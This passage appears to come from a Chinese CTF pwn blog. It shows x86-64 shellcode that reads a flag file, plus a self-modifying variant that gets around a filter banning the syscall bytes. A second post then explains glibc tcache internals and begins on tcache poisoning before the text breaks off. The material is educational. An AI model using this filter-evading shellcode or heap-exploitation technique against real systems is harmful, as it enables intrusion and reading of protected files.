<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">;;; OPEN</span><br><span class="line"></span><br><span class="line">  ; Syscall 2 &#x3D; sys_open</span><br><span class="line">  xor rax, rax</span><br><span class="line">  mov al, 2</span><br><span class="line"></span><br><span class="line">  ; rdi &#x3D; filename</span><br><span class="line">  jmp short getfilename_bottom</span><br><span class="line">getfilename_top:</span><br><span class="line">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class="line"></span><br><span class="line">  ; rsi &#x3D; flags</span><br><span class="line">  xor rsi, rsi</span><br><span class="line"></span><br><span class="line">  ; rdx &#x3D; mode</span><br><span class="line">  xor rdx, rdx</span><br><span class="line"></span><br><span class="line">  ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class="line">  syscall</span><br><span class="line"></span><br><span class="line">;;; READ</span><br><span class="line"></span><br><span class="line">  push rdi ; Temporarly store the filename pointer</span><br><span class="line">  push rax ; Temporarily store the handle</span><br><span class="line"></span><br><span class="line">  ; Syscall 0 &#x3D; sys_read</span><br><span class="line">  xor rax, rax</span><br><span class="line"></span><br><span class="line">  ; rdi &#x3D; file handle</span><br><span class="line">  pop rdi</span><br><span class="line"></span><br><span class="line">  ; rsi &#x3D; buffer (same as filename)</span><br><span class="line">  pop rsi</span><br><span class="line"></span><br><span class="line">  ; rdx &#x3D; count</span><br><span class="line">  xor rdx, rdx</span><br><span class="line">  mov dl, 30</span><br><span class="line"></span><br><span class="line">  ; Perform sys_read() syscall, reading from the opened file</span><br><span class="line">  syscall</span><br><span class="line"></span><br><span class="line">;;; WRITE</span><br><span class="line"></span><br><span class="line">  ; Syscall 1 &#x3D; sys_write</span><br><span class="line">  xor rax, rax</span><br><span class="line">  inc rax</span><br><span class="line"></span><br><span class="line">  ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class="line">  xor rdi, rdi</span><br><span class="line">  inc rdi</span><br><span class="line"></span><br><span class="line">  ; (rsi is already the buffer)</span><br><span class="line"></span><br><span class="line">  ; rdx is the count again</span><br><span class="line">  xor rdx, rdx</span><br><span class="line">  mov dl, 30</span><br><span class="line"></span><br><span class="line">  ; Perform the sys_write syscall, writing the data to stdout</span><br><span class="line">  syscall</span><br><span class="line"></span><br><span class="line">;;; EXIT</span><br><span class="line">  ; Syscall 60 &#x3D; exit</span><br><span class="line">  xor rax, rax</span><br><span class="line">  mov al, 60</span><br><span class="line"></span><br><span class="line">  ; Exit with code 0</span><br><span class="line">  xor rdi, rdi</span><br><span class="line"></span><br><span class="line">  ; Perform an exit</span><br><span class="line">  syscall</span><br><span class="line"></span><br><span class="line">getfilename_bottom:</span><br><span class="line">  call getfilename_top</span><br><span class="line"></span><br><span class="line">  db &quot;&#x2F;home&#x2F;ctf&#x2F;flag.txt&quot; ; The literal flag, fortunately the buffer itself is null-filled so we don&#39;t need to null terminate</span><br></pre></td></tr></table></figure>
<p>看一下这个，是没有00字节的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pz1o@pz1o:~&#x2F;桌面$ ndisasm -b64 a</span><br><span class="line">00000000  4831C0            xor rax,rax</span><br><span class="line">00000003  B002              mov al,0x2</span><br><span class="line">00000005  EB34              jmp short 0x3b</span><br><span class="line">00000007  5F                pop rdi</span><br><span class="line">00000008  4831F6            xor rsi,rsi</span><br><span class="line">0000000B  4831D2            xor rdx,rdx</span><br><span class="line">0000000E  0F05              syscall</span><br><span class="line">00000010  57                push rdi</span><br><span class="line">00000011  50                push rax</span><br><span class="line">00000012  4831C0            xor rax,rax</span><br><span class="line">00000015  5F                pop rdi</span><br><span class="line">00000016  5E                pop rsi</span><br><span class="line">00000017  4831D2            xor rdx,rdx</span><br><span class="line">0000001A  B21E              mov dl,0x1e</span><br><span class="line">0000001C  0F05              syscall</span><br><span class="line">0000001E  4831C0            xor rax,rax</span><br><span class="line">00000021  48FFC0            inc rax</span><br><span class="line">00000024  4831FF            xor rdi,rdi</span><br><span class="line">00000027  48FFC7            inc rdi</span><br><span class="line">0000002A  4831D2            xor rdx,rdx</span><br><span class="line">0000002D  B21E              mov dl,0x1e</span><br><span class="line">0000002F  0F05              syscall</span><br><span class="line">00000031  4831C0            xor rax,rax</span><br><span class="line">00000034  B03C              mov al,0x3c</span><br><span class="line">00000036  4831FF            xor rdi,rdi</span><br><span class="line">00000039  0F05              syscall</span><br><span class="line">0000003B  E8C7FFFFFF        call qword 0x7</span><br><span class="line">00000040  2F                db 0x2f</span><br><span class="line">00000041  686F6D652F        push qword 0x2f656d6f</span><br><span class="line">00000046  63                db 0x63</span><br><span class="line">00000047  7466              jz 0xaf</span><br><span class="line">00000049  2F                db 0x2f</span><br><span class="line">0000004A  666C              o16 insb</span><br><span class="line">0000004C  61                db 0x61</span><br><span class="line">0000004D  672E7478          cs jz 0xc9</span><br><span class="line">00000051  74                db 0x74</span><br></pre></td></tr></table></figure>
<h2 id="runme3"><a href="#runme3" class="headerlink" title="runme3"></a>runme3</h2><p>这个直接把<code>syscall</code>ban了，那我们应该用什么呢？</p>
<p>也就是<code>0f</code> <code>05</code></p>
<p>这里的trick还是很有意思的，自己写一个编码器，那么我们来看一下如何实现吧？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">; Jump down to the bottom, where we have the bytes for syscall (less 1) waiting</span><br><span class="line">jmp short my_fake_syscall_bottom</span><br><span class="line">  my_fake_syscall_top:</span><br><span class="line">  pop rbx ; Pop the address of the syscall-minus-1 block into rbx</span><br><span class="line">  add word [rbx], 0x0101 ; Increment the two bytes - 0x0e -&gt; 0x0f and 0x04 -&gt; 0x05</span><br><span class="line"></span><br><span class="line">  ; Now rbx points to &quot;syscall &#x2F; ret&quot;, so we can just call that any time we</span><br><span class="line">  ; need a syscall!</span><br><span class="line">  ;</span><br><span class="line">  ; Other than changing &quot;syscall&quot; to &quot;call rbx&quot;, the rest is identical!</span><br><span class="line"></span><br><span class="line">;;; OPEN</span><br><span class="line"></span><br><span class="line">  ; Syscall 2 &#x3D; sys_open</span><br><span class="line">  xor rax, rax</span><br><span class="line">  mov al, 2</span><br><span class="line"></span><br><span class="line">  ; rdi &#x3D; filename</span><br><span class="line">  jmp short getfilename_bottom</span><br><span class="line">getfilename_top:</span><br><span class="line">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class="line"></span><br><span class="line">  ; rsi &#x3D; flags</span><br><span class="line">  xor rsi, rsi</span><br><span class="line"></span><br><span class="line">  ; rdx &#x3D; mode</span><br><span class="line">  xor rdx, rdx</span><br><span class="line"></span><br><span class="line">  ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class="line">  call rbx</span><br><span class="line"></span><br><span class="line">;;; READ</span><br><span class="line"></span><br><span class="line">  push rdi ; Temporarly store the filename pointer</span><br><span class="line">  push rax ; Temporarily store the handle</span><br><span class="line"></span><br><span class="line">  ; Syscall 0 &#x3D; sys_read</span><br><span class="line">  xor rax, rax</span><br><span class="line"></span><br><span class="line">  ; rdi &#x3D; file handle</span><br><span class="line">  pop rdi</span><br><span class="line"></span><br><span class="line">  ; rsi &#x3D; buffer (same as filename)</span><br><span class="line">  pop rsi</span><br><span class="line"></span><br><span class="line">  ; rdx &#x3D; count</span><br><span class="line">  xor rdx, rdx</span><br><span class="line">  mov dl, 30</span><br><span class="line"></span><br><span class="line">  ; Perform sys_read() syscall, reading from the opened file</span><br><span class="line">  call rbx</span><br><span class="line"></span><br><span class="line">;;; WRITE</span><br><span class="line"></span><br><span class="line">  ; Syscall 1 &#x3D; sys_write</span><br><span class="line">  xor rax, rax</span><br><span class="line">  inc rax</span><br><span class="line"></span><br><span class="line">  ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class="line">  xor rdi, rdi</span><br><span class="line">  inc rdi</span><br><span class="line"></span><br><span class="line">  ; (rsi is already the buffer)</span><br><span class="line"></span><br><span class="line">  ; rdx is the count again</span><br><span class="line">  xor rdx, rdx</span><br><span class="line">  mov dl, 30</span><br><span class="line"></span><br><span class="line">  ; Perform the sys_write syscall, writing the data to stdout</span><br><span class="line">  call rbx</span><br><span class="line"></span><br><span class="line">;;; EXIT</span><br><span class="line">  ; Syscall 60 &#x3D; exit</span><br><span class="line">  xor rax, rax</span><br><span class="line">  mov al, 60</span><br><span class="line"></span><br><span class="line">  ; Exit with code 0</span><br><span class="line">  xor rdi, rdi</span><br><span class="line"></span><br><span class="line">  ; Perform an exit</span><br><span class="line">  call rbx</span><br><span class="line"></span><br><span class="line">my_fake_syscall_bottom:</span><br><span class="line">  call my_fake_syscall_top</span><br><span class="line"></span><br><span class="line">  ; This little block will become &quot;syscall &#x2F; ret&quot;</span><br><span class="line">  db 0x0e, 0x04 ; syscall is actually 0x0f 0x05</span><br><span class="line">  ret ; Return after doing a syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getfilename_bottom:</span><br><span class="line">  call getfilename_top</span><br><span class="line"></span><br><span class="line">  db &quot;.&#x2F;flag.txt&quot; ; The literal flag, fortunately the buffer itself is null-filled so we don&#39;t need to null terminate</span><br></pre></td></tr></table></figure>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2021/03/08/tcache/">tcache</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2021-03-08
        </span><span class="post-visits"
             data-url="/2021/03/08/tcache/"
             data-title="tcache">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><p>down的wiki，便于自己多看。主要梳理一下结构。</p>
<h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01 Introduction"></a>0x01 Introduction</h1><p>tcache是glibc 2.26(Ubuntu 17.10)之后引入的一种技术，其目的是为了提升堆管理的性能。</p>
<h2 id="1-结构体"><a href="#1-结构体" class="headerlink" title="1.结构体"></a>1.结构体</h2><p><code>tcache_entry</code> 和 <code>tcache_perthread_struct</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>tcache_entry</code> 用于链接空闲的 chunk 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk。</p>
<p>需要注意的是这里的 <strong>next 指向 chunk 的 user data，而 fastbin 的 fd 指向 chunk 开头的地址。</strong></p>
<p>而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p>
<p>如图<img src="/2021/03/08/tcache/20210201102625163.png" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>tcache_perthread_struct是用来管理tcache链表的，这个结构体位于heap段的起始位置，size大小为0x251。每一个thread都会维护一个tcache_perthread_struct结构体，一共有TCACHE_MAX_BINS个计数器TCACHE_MAX_BINS项tcache_entry。</p>
<ul>
<li>tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk</li>
<li>counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk</li>
</ul>
<p><img src="/2021/03/08/tcache/20210201160752119.jpg" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="2-执行流程"><a href="#2-执行流程" class="headerlink" title="2.执行流程"></a>2.执行流程</h2><ol>
<li>第一次malloc，会分配一块大内存存放<code>tcache_perthread_struct</code>，一般为0x251</li>
<li>释放chunk时，如果chunk的size小于small bin size，在<strong>进入tcache之前</strong>会先放进fastbin或者unsorted bin中</li>
<li>在<strong>放入tcache后</strong>：<ul>
<li>先放到对应的tcache中，直到tcache被填满（7个）</li>
<li><strong>tcache被填满后</strong>，接下来再释放chunk，就会直接放进fastbin或者unsorted bin中</li>
<li>tcache中的chunk<strong>不会发生合并</strong>，不取消inuse bit</li>
</ul>
</li>
<li>重新申请chunk，并且申请的size符合tcache的范围，则先从<strong>tcache中取chunk</strong>，直到tcache为空</li>
<li>tcache为空后，从bin中找</li>
<li>tcache为空时，如果fastbin、small bin、unsorted bin中有size符合的chunk，会先把fastbin、small bin、unsorted bin中的chunk放到tcache中，直到填满，之后再从tcache中取</li>
</ol>
<h2 id="3-源码分析"><a href="#3-源码分析" class="headerlink" title="3.源码分析"></a>3.源码分析</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  arena_get (ar_ptr, bytes); <span class="comment">// 找到可用的 arena</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn't enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim) <span class="comment">// 初始化 tcache</span></span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里初始化了tcache</p>
<p>主要就是找arena和分配chunk</p>
</blockquote>
<h3 id="内存申请"><a href="#内存申请" class="headerlink" title="内存申请"></a>内存申请</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// 从 tcache list 中获取内存</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>首先是在tcache中有chunk的时候，if判断要取出的chunk的size是否满足idx的合法范围，在tcache-&gt;entries不为空时调用<code>tcache_get()</code>函数获取chunk。</p>
</blockquote>
<h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];<span class="comment">//获取指针</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);<span class="comment">//检查</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;<span class="comment">//替换下一个指针</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); </span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>从<code>tcache-&gt;entries[tc_idx]</code>获取一个chunk指针，并且<code>tcache-&gt;counts</code>减一，没有过多的安全检查或者保护</p>
</blockquote>
<h3 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以看到首先判断<code>tc_idx</code>的合法性，判断<code>tcache-&gt;counts[tc_idx]</code>在7个以内时，进入<code>tcache_put()</code>函数，传递的一参为要释放的chunk指针，二参为chunk对应的size在tcache中的下标</p>
</blockquote>
<h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//释放的chunk</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//判断下标是否符合</span></span><br><span class="line">  <span class="comment">//链表的替换</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  <span class="comment">//数量增加</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>tcache_put()函数执行过程中把释放的chunk插入到了tcache-&gt;entries[tc_idx]链表的头部，整个插入的过程中也没有做任何的安全检查及保护，也没有将P标志位变为0</p>
</blockquote>
<p>其实我们也发现了，重点攻击的地方应该就是<code>tcache_get</code>和<code>tcache_put</code>两个地方。</p>
<h1 id="0x02-PWN-tcache"><a href="#0x02-PWN-tcache" class="headerlink" title="0x02 PWN tcache"></a>0x02 PWN tcache</h1><h2 id="1-tcache-poisoning"><a href="#1-tcache-poisoning" class="headerlink" title="1.tcache poisoning"></a>1.tcache poisoning</h2><p>tcache poisoning主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址。</p>
<p><img src="/2021/03/08/tcache/image-20210314162103060.png" alt="image-20210314162103060"></p>
<p>此时如果把图中fd值改为我们想要的值，那么攻击就成功了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span 